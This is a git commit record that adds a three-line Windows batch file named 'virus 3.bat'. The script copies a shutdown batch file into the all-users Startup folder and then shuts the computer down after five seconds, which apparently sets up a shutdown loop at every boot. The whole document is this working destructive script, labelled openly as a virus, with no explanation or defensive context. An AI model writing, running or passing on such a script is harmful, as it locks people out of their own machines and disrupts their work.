cd49a6730a14fe68c75d510e3fb6ebab39617de9
HackScribe <135351214+HackScribe@users.noreply.github.com>
2023-06-02 17:17:07 +0200

    Create virus 3.bat

---
+++ virus 3.bat
@@ -0,0 +1,3 @@
+copy Shutdown_at_Startup_for_all_users(Win_7_ and_XP).bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+copy Shutdown_at_Startup_for_all_users(Win_7_ and_XP).bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"		
+Shutdown -s -t 05
